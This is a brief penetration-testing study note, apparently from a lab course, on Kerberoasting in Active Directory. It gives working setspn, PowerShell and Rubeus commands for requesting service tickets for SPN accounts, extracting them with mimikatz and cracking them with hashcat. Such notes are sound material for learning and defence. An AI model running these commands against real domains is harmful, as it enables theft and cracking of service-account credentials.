Abuses the [[Basics#Kerberos|Kerberos protocol ]]to harvest password hashes (TGS ticket) for AD users with Service Principal Name (SPN) values (service accounts). These hashes can then either be cracked offline, or we can use pass-the-hash functionalities (in `evil-winrm` for example).

Steps:
- Find accounts with SPN
- Trigger kerberoast attack with tools such as Rubeus
- Take hashes offline and use hashcat -m 13100

Tools:
- GetUserSPN from Impacket (python)
- kerberoast ()
- targetedKerberoast
- Rubeus

## Windows

### Long method

- Enumerate SPN with native command `setspn.exe` (`setspn.exe -Q */*`)
- Manually: load ticket into memory using Powershell:
	- ```Add-Type -AssemblyName System.IdentityModel
	- `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
- using `setspn.exe`:
	- `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
- Extract ticket from memory using mimikatz
- Use kirbi2john
- hashcat

### With tools
We have quicker method with tools doing most of the work:
- PowerView
- Rubeus
	- Examples:
		- `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
		-  `.\Rubeus.exe kerberoast /user:<my-user> /nowrap